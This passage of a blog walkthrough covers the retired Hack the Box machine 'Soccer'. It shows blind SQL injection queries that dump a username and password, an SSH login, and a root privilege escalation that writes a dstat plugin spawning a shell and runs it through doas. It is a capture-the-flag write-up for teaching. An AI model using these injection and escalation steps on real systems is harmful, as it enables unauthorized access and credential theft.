+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM information_schema.COLUMNS where table_schema = 'soccer_db' and table_name='accounts' and COLUMN_NAME like '__loop__%' and COLUMN_NAME != 'email' and COLUMN_NAME != 'username' and COLUMN_NAME != 'id'"</span> f
+<span class="go">p
+pa
+pas
+pass
+passw
+passwo
+passwor
+password
+┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM information_schema.COLUMNS where table_schema = 'soccer_db' and table_name='accounts' and COLUMN_NAME like '__loop__%' and COLUMN_NAME != 'email' and COLUMN_NAME != 'username' and COLUMN_NAME != 'id' and COLUMN_NAME !='password'"</span> f</code></pre></figure>
+
+<p>Now I can extract data out of the username and password columns.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM accounts where username like '__loop__%'"</span> f                        
+<span class="go">p
+pl
+pla
+play
+playe
+player
+┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM accounts where username like '__loop__%' and username != 'player'"</span> f 
+<span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM accounts where password like BINARY '__loop__%'"</span> t         
+<span class="go">P
+Pl
+Pla
+Play
+Playe
+Player
+PlayerO
+PlayerOf
+PlayerOft
+PlayerOfth
+PlayerOfthe
+PlayerOftheM
+PlayerOftheMa
+PlayerOftheMat
+PlayerOftheMatc
+PlayerOftheMatch
+PlayerOftheMatch2
+PlayerOftheMatch20
+PlayerOftheMatch202
+PlayerOftheMatch2022</span></code></pre></figure>
+
+<p>I have now discovered the credentials <code class="language-plaintext highlighter-rouge">player:PlayerOftheMatch2022</code>.  I ssh in as player and obtain the <code class="language-plaintext highlighter-rouge">user.txt</code> flag.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>ssh player@10.10.11.194         
+<span class="go">player@10.10.11.194's password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Jun 19 19:53:12 UTC 2023
+
+  System load:           0.0
+  Usage of /:            70.1% of 3.84GB
+  Memory usage:          20%
+  Swap usage:            0%
+  Processes:             230
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.194
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:63eb
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Tue Dec 13 07:29:10 2022 from 10.10.14.19
+</span><span class="gp">player@soccer:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt |wc
+<span class="go">      1       1      33</span></code></pre></figure>
+
+<h2 id="root">Root</h2>
+<p>Looking at which applications have the SUID bit set I discover an unsual one, <code class="language-plaintext highlighter-rouge">doas</code></p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">player@soccer:~$</span><span class="w"> </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
+<span class="go">/usr/local/bin/doas
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/umount
+/usr/bin/fusermount
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/at
+/snap/snapd/17883/usr/lib/snapd/snap-confine
+/snap/core20/1695/usr/bin/chfn
+/snap/core20/1695/usr/bin/chsh
+/snap/core20/1695/usr/bin/gpasswd
+/snap/core20/1695/usr/bin/mount
+/snap/core20/1695/usr/bin/newgrp
+/snap/core20/1695/usr/bin/passwd
+/snap/core20/1695/usr/bin/su
+/snap/core20/1695/usr/bin/sudo
+/snap/core20/1695/usr/bin/umount
+/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1695/usr/lib/openssh/ssh-keysign</span></code></pre></figure>
+
+<p>Looking at the man pages for <code class="language-plaintext highlighter-rouge">doas</code> I see the application allows me to execute commands as another user and I should check <code class="language-plaintext highlighter-rouge">/usr/local/etc/doas.conf</code> for current configuration.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">DOAS(1)                                                                                                BSD General Commands Manual                                                                                               DOAS(1)
+
+NAME
+     doas — execute commands as another user
+
+SYNOPSIS
+     doas [-nSs] [-a style] [-C config] [-u user] [--] command [args]
+
+DESCRIPTION
+     The doas utility executes the given command as another user.  The command argument is mandatory unless -C, -S, or -s is specified.
+
+     The options are as follows:
+
+     -a style    Use the specified authentication style when validating the user, as allowed by /etc/login.conf.  A list of doas-specific authentication methods may be configured by adding an ‘auth-doas’ entry in login.conf(5).
+
+     -C config   Parse and check the configuration file config, then exit.  If command is supplied, doas will also perform command matching.  In the latter case either ‘permit’, ‘permit nopass’ or ‘deny’ will be printed on standard
+                 output, depending on command matching results.  No command is executed.
+
+     -n          Non interactive mode, fail if doas would prompt for password.
+
+     -S          Same as -s but simulates a full login. Please note this may result in doas applying resource limits to the user based on the target user's login class. However, environment variables applicable to the target user
+                 are still stripped, unless KEEPENV is specified.
+
+     -s          Execute the shell from SHELL or /etc/passwd.
+
+     -u user     Execute the command as user.  The default is root.  Please note: On some systems multiple usernames can resolve to one UID. For example, root and toor both resolve to UID 0 on FreeBSD. Please see the "as" syntax
+                 section of the doas.conf manual page for details on how doas handles this situation.
+
+     --          Any dashes after a combined double dash (--) will be interpreted as part of the command to be run or its parameters. Not an argument passed to doas itself.
+
+EXIT STATUS
+</span><span class="gp">     The doas utility exits 0 on success, and &gt;</span>0 <span class="k">if </span>an error occurs.  It may fail <span class="k">for </span>one of the following reasons:
+<span class="go">
+     •   The config file /usr/local/etc/doas.conf could not be parsed.
+     •   The user attempted to run a command which is not permitted.
+     •   The password was incorrect.
+     •   The specified command was not found or is not executable.
+
+SEE ALSO
+     su(1), doas.conf(5)
+
+HISTORY
+     The doas command first appeared in OpenBSD 5.8.
+
+AUTHORS
+</span><span class="gp">     Ted Unangst &lt;tedu@openbsd.org&gt;</span><span class="w">
+</span><span class="go">
+BSD                                                       </span></code></pre></figure>
+
+<p>Looking at doas.conf I see I am able to run <code class="language-plaintext highlighter-rouge">dstat</code> as root.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">player@soccer:~$</span><span class="w"> </span><span class="nb">cat</span> /usr/local/etc/doas.conf
+<span class="go">permit nopass player as root cmd /usr/bin/dstat</span></code></pre></figure>
+
+<p>Looking up dstat on <a href="https://gtfobins.github.io/gtfobins/dstat/" rel="external nofollow noopener" target="_blank">gtfo bins</a> I find a suitable privilege escalation.  I just need to replace sudo with the doas command.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">player@soccer:~$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'import os; os.execv("/bin/sh", ["sh"])'</span> <span class="o">&gt;</span>/usr/local/share/dstat/dstat_xxx.py
+<span class="gp">player@soccer:~$</span><span class="w"> </span>doas /usr/bin/dstat <span class="nt">--xxx</span>
+<span class="gp">/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib;</span><span class="w"> </span>see the module<span class="s1">'s documentation for alternative uses
+</span><span class="go">  import imp
+</span><span class="gp">#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span><span class="gp">#</span><span class="w"> </span><span class="nb">cd</span> /root
+<span class="gp">#</span><span class="w"> </span><span class="nb">cat </span>root.txt |wc
+<span class="go">      1       1      33</span></code></pre></figure>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>“Soccer” is an example of one of the many intriguing challenges available on Hack the Box. I intend to publish walkthroughs of future retired boxes as I continue using the platform to broaden my knowledge.</p>
+
+
+  </article>
+
+
+  
+    
+    <br>
+    <hr>
+    <br>
+    <ul class="list-disc pl-8"></ul>
+
+    <!-- Adds related posts to the end of an article -->
+    <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2>
+    <p class="mb-2">Here are some more articles you might like to read next:</p>
+  
+
+  <li class="my-2">
+    <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2023/metatwo/">MetaTwo</a>
+  </li>
+
+</div>
+
+    </div>
+
+    <!-- Footer -->    
+    <footer class="fixed-bottom">
+      <div class="container mt-0">
+        © Copyright 2025 Will  Lindsey. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>.
+
+      </div>
+    </footer>
+
+    <!-- JavaScripts -->
+    <!-- jQuery -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+
+    <!-- Bootsrap & MDB scripts -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js" integrity="sha256-fgLAgv7fyCGopR/gBNq2iW3ZKIdqIcyshnUULC4vex8=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script>
+
+    <!-- Masonry & imagesLoaded -->
+  <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script>
+  <script defer src="/assets/js/masonry.js" type="text/javascript"></script>
+    
+  <!-- Medium Zoom JS -->
+  <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.8/dist/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
+  <script defer src="/assets/js/zoom.js"></script><!-- Load Common JS -->
+  <script defer src="/assets/js/common.js"></script>
+  <script defer src="/assets/js/copy_code.js" type="text/javascript"></script>
+
+    
+  <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script>
+  <script async src="https://badge.dimensions.ai/badge.js"></script>
+
+    <!-- MathJax -->
+  <script type="text/javascript">
+    window.MathJax = {
+      tex: {
+        tags: 'ams'
+      }
+    };
+  </script>
+  <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script>
+  <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+
+    
+    
+
+<!-- Scrolling Progress Bar -->
+<script type="text/javascript">
+  /*
+   * This JavaScript code has been adapted from the article 
+   * https://css-tricks.com/reading-position-indicator/ authored by Pankaj Parashar, 
+   * published on the website https://css-tricks.com on the 7th of May, 2014.
+   * Couple of changes were made to the original code to make it compatible 
+   * with the `al-foio` theme.
+   */
+  const progressBar = $("#progress");
+  /*
+   * We set up the bar after all elements are done loading.
+   * In some cases, if the images in the page are larger than the intended
+   * size they'll have on the page, they'll be resized via CSS to accomodate
+   * the desired size. This mistake, however, breaks the computations as the
+   * scroll size is computed as soon as the elements finish loading.
+   * To account for this, a minimal delay was introduced before computing the
+   * values.
+   */
+  window.onload = function () {
+    setTimeout(progressBarSetup, 50);
+  };
+  /*
+   * We set up the bar according to the browser.
+   * If the browser supports the progress element we use that.
+   * Otherwise, we resize the bar thru CSS styling
+   */
+  function progressBarSetup() {
+    if ("max" in document.createElement("progress")) {
+      initializeProgressElement();
+      $(document).on("scroll", function() {
+        progressBar.attr({ value: getCurrentScrollPosition() });
+      });
+      $(window).on("resize", initializeProgressElement);
+    } else {
+      resizeProgressBar();
+      $(document).on("scroll", resizeProgressBar);
+      $(window).on("resize", resizeProgressBar);
+    }
+  }
+  /*
+   * The vertical scroll position is the same as the number of pixels that
+   * are hidden from view above the scrollable area. Thus, a value > 0 is
+   * how much the user has scrolled from the top
+   */
+  function getCurrentScrollPosition() {
+    return $(window).scrollTop();
+  }
+
+  function initializeProgressElement() {
+    let navbarHeight = $("#navbar").outerHeight(true);
+    $("body").css({ "padding-top": navbarHeight });
+    $("progress-container").css({ "padding-top": navbarHeight });
+    progressBar.css({ top: navbarHeight });
+    progressBar.attr({
+      max: getDistanceToScroll(),
+      value: getCurrentScrollPosition(),
+    });
+  }
+  /*
+   * The offset between the html document height and the browser viewport
+   * height will be greater than zero if vertical scroll is possible.
+   * This is the distance the user can scroll
+   */
+  function getDistanceToScroll() {
+    return $(document).height() - $(window).height();
+  }
+
+  function resizeProgressBar() {
+    progressBar.css({ width: getWidthPercentage() + "%" });
+  }
+  // The scroll ratio equals the percentage to resize the bar
+  function getWidthPercentage() {
+    return (getCurrentScrollPosition() / getDistanceToScroll()) * 100;
+  }
+</script>
+
+  </body>
+</html>
